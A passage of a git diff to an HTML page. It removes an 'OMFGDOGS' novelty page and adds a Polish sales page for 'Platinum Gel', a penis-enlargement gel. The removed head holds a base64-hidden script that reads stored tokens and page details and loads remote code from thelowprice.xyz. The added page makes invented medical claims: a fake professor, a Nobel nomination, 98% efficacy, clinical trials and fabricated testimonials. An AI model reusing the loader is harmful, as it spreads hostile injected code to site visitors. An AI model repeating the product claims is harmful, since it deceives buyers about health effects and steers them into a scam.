@@ -1,86 +1,429 @@
+<!DOCTYPE html>
 <html>
-    <head>
-	
-	<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfWUdYazlqUGRMckoyd1lONCc7CiAgICBpZiAoIXdpbmRvdy5fWUdYazlqUGRMckoyd1lONCkgewogICAgICAgIHdpbmRvdy5fWUdYazlqUGRMckoyd1lONCA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly90aGVsb3dwcmljZS54eXovZ21DS1JQUnAnLAogICAgICAgICAgICBQX1BBVEg6ICdodHRwczovL3RoZWxvd3ByaWNlLnh5ei8zNGZkOTZlL3Bvc3RiYWNrJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgXzZad3RUR2pTVlBGelE2NTggPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF82Wnd0VEdqU1ZQRnpRNjU4ICE9PSAndW5kZWZpbmVkJyAmJiBfNlp3dFRHalNWUEZ6UTY1OCAhPT0gbnVsbCkgewogICAgICAgIHZhciBfcmdtZzRkZmZ4OG42WVhQRiA9IEpTT04ucGFyc2UoXzZad3RUR2pTVlBGelE2NTgpOwogICAgICAgIHZhciBfelBOeDZzQmRtc0M5Q1hwWCA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9yZ21nNGRmZng4bjZZWFBGLmNyZWF0ZWRfYXQgKyB3aW5kb3cuX1lHWGs5alBkTHJKMndZTjQudHRsIDwgX3pQTng2c0JkbXNDOUNYcFgpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF93Q0o5azVndEN3SzNLWTdDID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX1ZXY0dianRjMnJ0SmJyYk4gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfcG0yZ1lrVHpyUzI1Z1dHdiA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX3BtMmdZa1R6clMyNWdXR3YgKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX3BtMmdZa1R6clMyNWdXR3YgKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfcG0yZ1lrVHpyUzI1Z1dHdiArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfcG0yZ1lrVHpyUzI1Z1dHdiArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX3BtMmdZa1R6clMyNWdXR3YgKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICBpZiAodHlwZW9mIF93Q0o5azVndEN3SzNLWTdDICE9PSAndW5kZWZpbmVkJyAmJiBfd0NKOWs1Z3RDd0szS1k3QyAmJiB3aW5kb3cuX1lHWGs5alBkTHJKMndZTjQudW5pcXVlKSB7CiAgICAgICAgX3BtMmdZa1R6clMyNWdXR3YgKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfd0NKOWs1Z3RDd0szS1k3Qyk7CiAgICB9CiAgICBpZiAodHlwZW9mIF9WV2NHYmp0YzJydEpicmJOICE9PSAndW5kZWZpbmVkJyAmJiBfVldjR2JqdGMycnRKYnJiTiAmJiB3aW5kb3cuX1lHWGs5alBkTHJKMndZTjQudW5pcXVlKSB7CiAgICAgICAgX3BtMmdZa1R6clMyNWdXR3YgKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9WV2NHYmp0YzJydEpicmJOKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll9ZR1hrOWpQZExySjJ3WU40LlJfUEFUSCArIF9wbTJnWWtUenJTMjVnV0d2OwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
-	
-        <title>OMFGDOGS</title>
-        <link rel="stylesheet" type="text/css" href="omfgdogs.css" />
-        <link href="js/toastr/toastr.css" rel="stylesheet"/>
-        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
-        <script src="js/toastr/toastr.js"></script>
-    </head>
-
-    <body>
-        <div id="overlay" class="container" onclick="off()">
-            <a href='#'class='playBut'>
-                <svg version="1.1"
-                    xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:a="http://ns.adobe.com/AdobeSVGViewerExtensions/3.0/"
-                    x="0px" y="0px" width="213.7px" height="213.7px" viewBox="0 0 213.7 213.7" enable-background="new 0 0 213.7 213.7"
-                    xml:space="preserve">
-
-                    <polygon class='triangle' id="XMLID_18_" fill="none" stroke-width="7" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" points="
-                        73.5,62.5 148.5,105.8 73.5,149.1 "/>
-
-                    <circle class='circle' id="XMLID_17_" fill="none" stroke-width="7" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" cx="106.8" cy="106.8" r="103.3"/>
-                </svg>
-            </a>
-        </div>
-
-        <audio id="omfgaudio" loop>
-            <source src="omfgdogs.mp3" type="audio/mpeg">
-        </audio>
-
-        <script type="text/javascript">
-            function off() {
-                document.getElementById("overlay").style.display = "none";
-                var audio = document.getElementById("omfgaudio");
-                audio.play();
-            }
-        </script>
-
-        <script type="text/javascript">
-            toastr.options = {
-              "closeButton": true,
-              "debug": false,
-              "positionClass": "toast-bottom-right",
-              "showDuration": "1000",
-              "hideDuration": "1000",
-              "timeOut": "100000",
-              "extendedTimeOut": "100000",
-              "showEasing": "swing",
-              "hideEasing": "linear",
-              "showMethod": "fadeIn",
-              "hideMethod": "fadeOut"
-           }
-        </script>
-
-        <div id="footer">
-            <div id="footer-left">
-                [ <a href="http://escism.net/" target="_blank">escism.net</a> ] [ <a href="https://twitter.com/eataudio" target="_blank">@eataudio</a> ]
-            </div>
-            <div id="footer-right" >
-                <div id="helptext">
-                    [ help keep the dogs running! ]
-                </div>
-                <form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_blank">
-                    <input type="hidden" name="cmd" value="_s-xclick" />
-                    <input type="hidden" name="hosted_button_id" value="J2EHN6Y6XPR6J" />
-                    <input type="image" src="https://omfgdogs.com/pp.png" border="0" name="submit" title="PayPal - The safer, easier way to pay online!" alt="Donate with PayPal button" />
-                    <img alt="" border="0" src="https://www.paypal.com/en_AU/i/scr/pixel.gif" width="1" height="1" />
-                </form>
-
-                <div id="btc">
-                    <a href="#"><img src="btc.svg" width="25px"/></a>
-                </div>
-            </div>
-        </div>
-
-        <script type="text/javascript">
-            $('#btc').click(function() {
-                toastr.info('Donate Bitcoin!<br /><a href="bitcoin:1DwMsjfHmgDjKRCwM5AM2gcQ4xidfJLDVT">1DwMsjfHmgDjKRCwM5AM2gcQ4xidfJLDVT</a>')
-            });
-            toastr.options.onHidden = function() { }
-        </script>
-        <script src="js/wat.js"></script>
-    </body>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<title>Platinum Gel</title>
+		<link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
+		<link rel="stylesheet" type="text/css" href="css/style.css">
+		<link rel="stylesheet" type="text/css" href="css/media.css">
+	<script type="text/javascript" src="script_land.js" defer></script></head>
+	<body>
+		<section class="container">
+			<div class="banner center-text">
+				<a href="#order">
+				<img src="img/banner.png" alt="banner" />
+				</a>
+			</div>
+			<div class="main-topic center-text padd">
+				<h1>Za 28 dni Twój penis będzie dłuższy minimum o 6 cm – efekt potwierdzony niezależnymi testami medycznymi</h1>
+			</div>
+			<div class="mg-top">
+				<div class="left-col padd">
+					<div class="left-col">
+						<div class="article-text">
+							<p>Witaj,</p>
+						</div>
+						<div class="article-text">
+							<p>Nazywam się prof. Paweł Halicki i jestem naukowcem, specjalistą z zakresu biologii molekularnej. Na tej stronie chcę przedstawić Ci największe osiągnięcie moje życia, za które właśnie otrzymałem nominację do Nagrody Nobla. Opracowałem metodę, dzięki której każdy może w naturalny i prosty sposób powiększyć swojego członka o ok. <a href="#order"><i class="blackedbold">6 cm w zaledwie 28 dni</i></a>.</p>
+						</div>
+					</div>
+					<div class="right-col img1">
+						<a href="#order">
+						<img src="img/doctor2.jpg" alt="doc" />
+						</a>
+					</div>
+					<div class="clear"></div>
+					<div class="middle-topic red-text">
+						<h2>Dlatego, jeśli chcesz BEZ pompek i ekstenderów:</h2>
+					</div>
+					<div class="list-1">
+						<ul>
+							<li>
+								<a href="#order"><i class="blackedbold">wydłużyć penisa minimum o 6 cm</i></a> – w sposób naturalny i bezpieczny dla zdrowia,
+							</li>
+							<li>
+								<a href="#order"><i class="blackedbold">pogrubić członka o 63%</i></a>  i dawać partnerce nawet 5 orgazmów pod rząd,
+							</li>
+							<li>
+								uzyskać <a href="#order"><i class="blackedbold">twarde jak skała wzwody</i></a> za każdym razem, gdy najdzie Cię ochota na seks,
+							</li>
+							<li>
+								utrzymać <a href="#order"><i class="blackedbold">potężną erekcję przez długi czas</i></a> bez łykania „niebieskich tabletek”,
+							</li>
+							<li>
+								<a href="#order"><i class="blackedbold">zwiększyć libido i poziom testosteronu,</i></a> a dzięki temu zyskać więcej energii i wytrzymałości w łóżku...
+							</li>
+						</ul>
+					</div>
+					<div class="article-text">
+						<p>...oraz osiągnąć to wszystko bez niebezpiecznych operacji plastycznych oraz drogich i niebezpiecznych dla zdrowia urządzeń do rozciągania penisa, a także zaoszczędzić tysiące złotych – <a href="#order"><i class="blackedbold">koniecznie przeczytaj, co mam Ci do przekazania.</i></a>.</p>
+					</div>
+					<div class="article-text">
+						<p>Nieważne, ile masz lat i od jak dawna próbowałeś powiększyć swojego penisa. Nieistotne, czy Twój członek jest przeciętnej wielkości, czy też wiele poniżej średniej. Nawet, jeśli lekarz powiedział Ci, że jesteś skazany na porażkę… Wiedz, że <a href="#order"><i class="blackedbold">za 28 dni możesz cieszyć się penisem dłuższym minimum o 6 cm</i></a>. Bez pompek, plastrów, kolorowych pigułek i ekstenderów!</p>
+					</div>
+					<div class="middle-topic red-text">
+						<h2>Oto, dlaczego moja metoda to doskonała alternatywa dla uciążliwych w stosowaniu urządzeń do powiększania penisa:</h2>
+					</div>
+					<div class="list-1">
+						<ul>
+							<li>
+								<a href="#order"><i class="blackedbold">pozbędziesz się ryzyka</i></a> uszkodzenia naczyń krwionośnych w penisie, problemów z wytryskiem i nieodwracalnej impotencji, które grożą mężczyznom używającym pompek i ekstenderów,
+							</li>
+							<li>
+								<a href="#order"><i class="blackedbold">zapomnisz o wstydzie i dyskomforcie,</i></a> które odczuwasz, gdy pokazujesz się partnerce, mając sztuczny wzwód, który bardzo krótko trwa,
+							</li>
+							<li>
+								<a href="#order"><i class="blackedbold">odzyskasz przyjemność</i></a> z długiego, dzikiego i spontanicznego seksu,
+							</li>
+							<li>
+								<a href="#order"><i class="blackedbold">będziesz mieć twarde jak skała erekcje</i></a> aż do wielkiego finału,
+							</li>
+							<li>
+								<a href="#order"><i class="blackedbold">zaoszczędzisz tysiące złotych,</i></a> zamiast trwonić je na nieskuteczne urządzenia, które psują się i wymagają wymiany.
+							</li>
+						</ul>
+					</div>
+					<div class="middle-topic red-text">
+						<h2>Opracowałem naturalną metodę, która rozszerza ciała jamiste Twojego penisa do ich genetycznego maksimum</h2>
+					</div>
+					<div class="article-text">
+						<p>Dzięki niej – nie będziesz już potrzebować pompek i ekstenderów do penisa <a href="#order"><i class="blackedbold">nawet, jeśli wcześniej nie mogłeś bez nich odbyć stosunku...</i></a> Zapomnisz o tych wszystkich problemach, które dokuczają Ci z powodu małego rozmiaru członka. Przestaniesz obawiać się, jak zareaguje kobieta, gdy zobaczy Cię nago. <a href="#order"><i class="blackedbold">Wreszcie zobaczysz w jej oczach tylko zachwyt, podziw i niepohamowaną żądzę.</i></a></p>
+					</div>
+					<div class="article-text">
+						<p>Bez problemu powiększysz penisa o minimum 6 cm i kilkakrotnie pogrubisz jego obwód. Zaczniesz z przyjemnością myśleć o namiętnych chwilach z jedną lub kilkoma kobietami naraz – mając pewność, że wszystkie je zadowolisz. A to wszystko dzięki temu, że udało mi się opracować formułę, która regeneruje ciała jamiste w penisie i <a href="#order"><i class="blackedbold">rozszerza je do ich genetycznego maksimum.</i></a></p>
+					</div>
+					<div class="article-text">
+						<p>Jak tego dokonałem?</p>
+					</div>
+					<div class="middle-topic red-text">
+						<h2>Chciałem uratować Ciebie i innych mężczyzn przed totalnym upokorzeniem</h2>
+					</div>
+					<div class="article-text">
+						<p>Według najnowszych badań, w Polsce co trzeci mężczyzna w wieku 25-75 lat nie jest zadowolony z rozmiaru swojego penisa. Mężczyźni ci często popadają w kompleksy i unikają kontaktów intymnych. Wśród nich aż 4 na 10 facetów ma naprawdę małe przyrodzenia (ok. 10-13 cm) i ukrywa ten fakt przed światem.</p>
+					</div>
+					<div class="article-text">
+						<p>Przeraża ich myśl, że kobieta, która im się podoba, spojrzy na ich penisa i go...wyśmieje. Im są starsi, tym ten kompleks bardziej wyniszcza ich psychicznie. Rodzina i kumple dostrzegają rozdrażnienie, smutek i stres przy kontaktach z kobietami. Widzą, że coś jest nie tak. Że nie układa się z partnerkami... Ale przecież nie można im tak po prostu powiedzieć „hej, to przez małego penisa!”. Facetowi nie przystoi przyznawać się do takich rzeczy. To kompletnie go dyskredytuje w oczach innych, staje się przedmiotem kpin i niewybrednych żartów...</p>
+					</div>
+					<div class="middle-topic red-text">
+						<h2>Nie czułem się prawdziwym mężczyzną</h2>
+					</div>
+					<div class="article-text">
+						<p>Ja sam nie potrafiłem się z tym pogodzić. Próbowałem wyleczyć się z kompleksów za pomocą różnych sposobów na powiększanie penisa. Boleśnie i na własnej skórze przekonałem się, że ogólnodostępne pompki, ekstendery, plastry, kolorowe pigułki i pierścienie po prostu nie działają. Przestałem chodzić na podryw. Byłem zdołowany i coraz bardziej załamany. Nic mnie nie cieszyło.</p>
+					</div>
+					<div class="article-text">
+						<p>Jednak najgorsze było to, że przez swoje problemy z rozmiarem nie czułem się prawdziwym mężczyzną. Nigdy nie zapomnę dnia, gdy zagadała do mnie w kawiarni śliczna dziewczyna. Wiedziałem, że chce mnie uwieść. Była naprawdę napalona. Umówiliśmy się wieczorem u niej. Wziąłem pompkę do penisa, żeby dodać sobie choć 2 cm. Z nabrzmiałym prąciem i pierścieniem zaciśniętym przy jądrach stanąłem przed dziewczyną, gotowy do działania.</p>
+					</div>
+					<div class="article-text">
+						<p>I wtedy spełnił się mój najgorszy koszmar... Dziewczyna popatrzyła na mnie jak na dziwoląga. Jej wzrok zatrzymał się na pierścieniu zaciskającym mój członek. Widziałem, jak zagryza wargi, żeby nie parsknąć śmiechem. Dla niej wyglądałem co najwyżej jak jakiś desperat. Postać z taniego filmu o robotach... Wściekły i zażenowany ubrałem się i pośpiesznie uciekłem z jej mieszkania.</p>
+					</div>
+					<div class="article-text">
+						<p>Wrzało we mnie z wściekłości i bezradności. Nie byłem żadnym impotentem, żeby „pompować” sobie penisa. Chciałem tylko dodać sobie kilka centymetrów. Tak po ludzku, dla pewności. Ta dziewczyna naprawdę mi się podobała i ostatnie, o czym myślałem, to zawód w łóżku… Jednak przez swoją naiwność wszystko zepsułem.</p>
+					</div>
+					<div class="article-text">
+						<p>W tamtym momencie chciałem zapaść się pod ziemię ze wstydu. Obiecałem sobie, że będę mądrzejszy i już nigdy nie użyję pompek, obciążników ani innych urządzeń tego rodzaju. Znam wiele przypadków, gdy takie eksperymenty kończyły się rozległymi siniakami, problemami ze wzwodem i oddawaniem moczu, a nawet nieodwracalną impotencją. A na swoim przykładzie wiem, że producenci tego typu rzeczy i kolorowych pigułek… chcą na Tobie tylko zarobić. Nie interesuje ich tak naprawdę czy Ci pomogą, czy nie.</p>
+					</div>
+					<div class="middle-topic red-text">
+						<h2>Jak wynalazłem „patent na małego penisa”?</h2>
+					</div>
+					<div class="article-text">
+						<p>Chciałem umożliwić innym mężczyznom, naturalne powiększenie penisa, a wraz z nim odzyskanie pewności siebie i radości z seksu. Sam trochę miałem z tym problem i zamierzałem skorzystać z tego w pierwszej kolejności. To jasne, że najpierw chciałem poszaleć i poznać wiele pięknych, fantastycznych kobiet. Ale potem przyszedłby czas na poważny związek, a nawet założenie rodziny.</p>
+					</div>
+					<div class="article-text">
+						<p>Pomyślałem sobie wtedy: przecież jesteś naukowcem! Po co masz korzystać z dostępnych (i nieskutecznych) rozwiązań, gdy możesz wymyślić coś zupełnie nowego?! Uczestniczyłem w odkryciach wielu substancji, które skutecznie zwalczają różne dolegliwości. Dlaczego więc nie miałbym opracować środka na powiększanie penisa?</i></a></p>
+					</div>
+					<div class="article-text">
+						<p>Następnego dnia rozpocząłem badania.</p>
+					</div>
+					<div class="article-text">
+						<p>Przez 11 miesięcy prowadziłem intensywne badania laboratoryjne. Testowałem na sobie różne połączenia substancji aktywnych. Zaznaczę tylko, że wszystkie były w <a href="#order"><i class="blackedbold">100% naturalne i bezpieczne dla organizmu</i></a>. Wiedza naukowa i odrobina szczęścia szybko zaowocowały – opracowałem unikalną formułę makro-molekularną. Natychmiast zgłosiłem ją do badań na szeroką skalę. Jej 98,3% skuteczność potwierdziły największe ośrodki badawcze w Europie i USA! Jeszcze w trakcie testów moja formuła w naturalny sposób powiększała rozmiar męskiego członka tysiącom ochotników.</p>
+					</div>
+					<div class="article-text">
+						<p><a href="#order"><i class="blackedbold">Już po 1 tygodniu wprowadzania tej formuły do organizmu</i></a>, zauważyłem, że mój penis wydłużył się o 2,6 cm. Wzrosło mi libido, a moje erekcje stały się twarde i 2 razy dłuższe. A to był dopiero początek. W trzecim tygodniu mój penis wydłużył się jeszcze bardziej i pogrubił swój obwód. Nawet w stanie spoczynku przyciągał zachwycone spojrzenia kobiet, gdy na basenie przechodziłem obok nich w obcisłych kąpielówkach.</p>
+					</div>
+					<div class="article-text">
+						<p>Pamiętam, że na początku czułem się tym lekko speszony. Po prostu nie mogłem się przyzwyczaić, że mój penis jest teraz powodem do dumy, a nie wstydu. Znów zacząłem umawiać się na randki, które przeważnie kończyły się w łóżku. Po zaledwie 4 tygodniach mogłem z całą pewnością powiedzieć o sobie, że <a href="#order"><i class="blackedbold">stałem się bogiem seksu! Wynalazłem patent na małego penisa!</i></a> Na samą myśl o tym, ilu mężczyznom pomogę, uśmiechałem się zadowolony.</p>
+					</div>
+					<div class="img2 center-text">
+						<img src="img/imgimg.jpg" alt="imgimg" />
+						<div class="frame-bottom-img">
+							<p>
+								Powiększyłem sobie penisa, a dzięki temu odzyskałem pewność siebie i radość z seksu.
+							</p>
+						</div>
+					</div>
+					<div class="middle-topic red-text">
+						<h2>Do tej pory mały penis był dla każdego faceta jak wyrok. Dziś, z pomocą mojej formuły makro-molekularnej można nie tylko zwiększyć długość członka, ale też pogrubić go i usprawnić.</h2>
+					</div>
+					<div class="article-text">
+						<p>Pozwól, że wyjaśnię Ci pokrótce, dlaczego Twój penis może być większy i to w ciągu 4 tygodni. Proces ten jest bardzo skomplikowany, jednak postaram się wyjaśnić to językiem zrozumiałym dla osoby, która nie jest naukowcem.</p>
+					</div>
+					<div class="article-text">
+						<p>Otóż rozmiar penisa jest uzależniony od specjalnych struktur zwanych ciałami jamistymi.</p>
+					</div>
+					<div class="clear"></div>
+					<div class="middle-topic red-text">
+						<h2>Rozmiar Twojego penisa Cię nie zadowala, ponieważ ciała jamiste w Twoim członku nie osiągnęły swojego maksymalnego, genetycznego rozmiaru</h2>
+					</div>
+					<div class="article-text">
+						<p>Wiesz dobrze, że jeśli regularnie ćwiczysz, z każdym tygodniem Twoje płuca są bardziej pojemne, a mięśnie coraz twardsze i wytrzymalsze. Ciała jamiste też można powiększyć, sprawiając, że do penisa napłynie więcej krwi i stanie się on dużo większy.</p>
+					</div>
+					<div class="article-text">
+						<p>Niestety, ciała jamiste zbudowane są z innych tkanek niż płuca czy mięśnie. To znaczy, że nie mogą być „wyćwiczone”, by na zawołanie powiększać się do maksymalnych rozmiarów. Z tego względu powiększanie penisa pompkami i obciążnikami jest <a href="#order"><i class="blackedbold">po prostu absurdalne i niemożliwe.</i></a></p>
+					</div>
+					<div class="article-text">
+						<p>Dlatego moim wyzwaniem było stworzenie formuły, która będzie miała radykalne działanie: <a href="#order"><i class="blackedbold">odblokuje pełen potencjał ciał jamistych i powiększa je do maksymalnego, genetycznego rozmiaru</i></a>. Dokonałem tego! Opracowałem silnie powiększającą ciała jamiste formułę makro-molekularną. Nazwałem ją Platinum gel.</p>
+					</div>
+					<div class="clear"></div>
+					<div class="middle-topic red-text">
+						<h2>Dlaczego moja formuła makro-molekularna została okrzyknięta „genialnym patentem na powiększanie penisa”?</h2>
+					</div>
+					<div class="middle-topic red-text yell-bg">
+						<h2><span>MA PONAD 98,6% SKUTECZNOŚCI W ROZSZERZANIU CIAŁ JAMISTYCH PRĄCIA</span></h2>
+					</div>
+					<div class="clear"></div>
+					<div class="img3 center-text">
+						<img src="img/ba.jpg" alt="ba" />
+					</div>
+					<div class="clear"></div>
+					<div class="col-1 center-text">
+						<p>PRZED<br>Ciała jamiste o ograniczonym potencjale do powiększania się</p>
+					</div>
+					<div class="col-1 center-text">
+						<p>PO<br>Ciała jamiste powiększone do swoich maksymalnych, genetycznych rozmiarów</p>
+					</div>
+					<div class="clear"></div>
+					<div class="middle-topic red-text yell-bg">
+						<h2><span>JEST W 100% BEZPIECZNE I BARDZO PROSTE W STOSOWANIU</span></h2>
+					</div>
+					<div class="article-text">
+						<p>Naturalne składniki czynią cuda – wystarczy, że nauka opracuje ich idealną kompozycję! Oto hasło, które przyświecało mi w stworzeniu formuły powiększającej penisa. Kuracja zawiera wyłącznie <a href="#order"><i class="blackedbold">naturalne, bezpiecznie i super skuteczne substancje</i></a>. Umieściłem je w formie żelu, żeby każdy bez problemu mógł przeprowadzić kurację samodzielnie w domu. Jest on bardzo prosty w użyciu. Wystarczy, że wymasujesz członka przed stosunkiem, aby od razu doznać dłuższych, silniejszych erekcji, a po 4 tygodniach imponować długim i grubym członkiem.</p>
+					</div>
+					<div class="middle-topic red-text">
+						<h2>Mężczyźni, którzy przyzwyczaili się do używania pompek do powiększania penisa, będą zdumieni skutecznością nowej formuły. Powód? Ich członki wydłużą się minimum o 6 cm i zwiększą swój obwód o 63%!</h2>
+					</div>
+					<div class="img3 center-text">
+						<img src="img/img5.jpg" alt="img5" />
+					</div>
+					<div class="middle-topic red-text">
+						<h2>Jak mógłbyś przegapić tę szansę na skuteczne powiększenie penisa?</h2>
+					</div>
+					<div class="article-text">
+						<p>Możesz dalej męczyć się z powodu zbyt małego członka. Możesz także nadal użerać się z irytującymi i nieskutecznymi pompkami i ekstenderami… Ale po co, skoro <a href="#order"><i class="blackedbold">gwarantuję Ci szybki, prosty i niedrogi sposób na powiększenie penisa i odzyskanie pewności siebie w łóżku</i></a>? Wystarczy zaledwie 28 dni kuracji, żebyś dołączył do 14 tys. zadowolonych użytkowników Platinum gel, którzy już czerpią nieopisaną przyjemność z seksu.</p>
+					</div>
+					<div class="middle-topic red-text">
+						<h2>Nic nie ryzykujesz!</h2>
+					</div>
+					<div class="article-text">
+						<p>Stosując <a href="#order"><i class="blackedbold">Platinum Gel</i></a> powiększysz penisa o minimum 6 cm w 28 dni. Dodatkowo nic nie ryzykujesz! Jako osiągnięcie na skalę światową moja formuła otrzymała <a href="#order"><i class="blackedbold">prestiżową gwarancję</i></a> potrójnej satysfakcji: oryginalności, jakości oraz zadowolenia.</p>
+					</div>
+					<div class="center-text">
+						<div class="middle-topic red-text">
+							<h2>Gwarancja potrójnej satysfakcji</h2>
+						</div>
+					</div>
+					<div class="article-text">
+						<p><a href="#order"><i class="blackedbold">1. Gwarancja oryginalności</i></a> – w kuracji makro-molekularnej Platinum gel zamknięto formułę na bazie najsilniejszych substancji wpływających na ciała jamiste w penisie. Jej skuteczność w powiększaniu ciał jamistych do ich maksymalnych, genetycznych rozmiarów potwierdzają testy kliniczne. <a href="#order"><i class="blackedbold">To jedyna tak innowacyjna formuła.</i></a> Dlatego możesz mieć pewność, że trafi do Ciebie oryginalny produkt, dostępny jedynie za pośrednictwem tej strony.</p>
+					</div>
+					<div class="article-text">
+						<p><a href="#order"><i class="blackedbold">2. Gwarancja jakości</i></a> – ze względu na zaawansowany proces wytwarzania formuły makro-molekularnej, Platinum gel spełnia najwyższe standardy jakości. W trosce o Twoje zdrowie i dobre samopoczucie, stężenie substancji aktywnych zostało dobrane tak, aby kuracja była całkowicie bezpieczna. Wszystko po to, żeby jej efekty <a href="#order"><i class="blackedbold">w 100% spełniły Twoje oczekiwania</i></a>.</p>
+					</div>
+					<div class="article-text">
+						<p><a href="#order"><i class="blackedbold">3. Gwarancja zadowolenia</i></a> – liczne testy laboratoryjne i konsumenckie potwierdzają najwyższą skuteczność kuracji Platinum gel. Na podstawie tych wyników kuracja zdobyła uznanie specjalistów z całego świata, którzy polecają ją swoim pacjentom. Są oni przekonani, że <a href="#order"><i class="blackedbold">w 28 dni wydłużysz penisa o 6,4 cm</i></a> i zaczniesz doświadczać długich, twardych erekcji – na zawołanie.</p>
+					</div>
+					<div class="middle-topic red-text">
+						<h2>Powiększ penisa w 28 dni z Platinum gel - szybko, łatwo i oszczędnie</h2>
+					</div>
+					<div class="article-text">
+						<p>Wielkie koncerny farmaceutyczne z USA i Japonii dosłownie biją się o patent na moją formułę makro-molekularną. Gdy już odsprzedam patent, kuracja będzie dostępna na całym świecie, ale na pewno będzie bardzo droga.</p>
+					</div>
+					<div class="article-text">
+						<p>Zanim do tego dojdzie, <a href="#order"><i class="blackedbold">postanowiłem najpierw udostępnić ją w Polsce za udział w klubie rabatowym – z dofinansowaniem 50% taniej</i></a>. Wszystko po to, żeby pomóc jak największej liczbie mężczyzn w moim ojczystym kraju.
+						</p>
+					</div>
+					<div class="article-text">
+						<p>Dlatego zachęcam Cię do skorzystania z tej szansy! Zamówienie klubu rabatowego jest proste. Nie musisz wysyłać żadnych pieniędzy przez internet, ani płacić kartą, żeby otrzymać Platinum gel. <a href="#order"><i class="blackedbold">Wystarczy, że wypełnisz formularz w 2 minuty</i></a> i już po kilku dniach otrzymasz przesyłkę, którą opłacisz wygodnie u kuriera lub listonosza.</p>
+					</div>
+					<div class="article-text">
+						<p>Dziękuję Ci za czas, który przeznaczyłeś na przeczytanie mojej wiadomości. Życzę Ci dużo szczęścia w Twoim nowym życiu. Wiem, że czeka Cię bardzo dużo namiętnych przygód, bo przecież... już za 28 dni <a href="#order"><i class="blackedbold">będziesz miał takiego penisa, o jakim zawsze marzyłeś!</i></a></p>
+					</div>
+					<div class="f-right-img">
+						<a href="#order">
+						<img src="img/sign.png" alt="sign" />
+						</a>
+						<div class="article-text">
+							<p>prof. Paweł Halicki</p>
+						</div>
+					</div>
+					<div class="features-wrapper"></div>
+				</div>
+				<div class="right-col padd aside">
+					<div class="frame-r-col center-text">
+						<a href="#order">
+						<img src="img/user1.jpg" alt="user1" />
+						</a>
+						<div class="middle-topic red-text">
+							<h2>Dzięki Platinum gel jestem potężnie wyposażony!</h2>
+						</div>
+						<div class="article-text">
+							<p>Nuda w łóżku? Odkąd stosuję tę kurację, w moim łóżku nie ma na nią miejsca. Mam 37 lat i 20,3 cm w rozporku. Laski mdleją z rozkoszy!</p>
+						</div>
+						<div class="article-text">
+							<p>+6,9 cm</p>
+						</div>
+						<div class="article-text">
+							<p><i class="yellow-star">★ ★ ★ ★</i><i class="gray-star"> ★</i></p>
+						</div>
+						<div class="article-text">
+							<p>Radek, l. 37, Kutno</p>
+						</div>
+					</div>
+					<div class="frame-r-col center-text">
+						<a href="#order">
+						<img src="img/user2.jpg" alt="user2" />
+						</a>
+						<div class="middle-topic red-text">
+							<h2>Człowieku, musisz TO mieć!</h2>
+						</div>
+						<div class="article-text">
+							<p>Po miesiącu mój penis był o 6,5 cm dłuższy i sterczał przez dobre 35 min. Prawie za każdym razem doprowadzam partnerkę do orgazmu. Często 2 razy pod rząd. Kompleksy i wstyd z powodu małego fiutka to przeszłość! Z moim „pytonem” żadna mi się nie oprze. Polecam!</p>
+						</div>
+						<div class="article-text">
+							<p>+6,5 cm</p>
+						</div>
+						<div class="article-text">
+							<p><i class="yellow-star">★ ★ ★ ★ ★</i><i class="gray-star"> </i></p>
+						</div>
+						<div class="article-text">
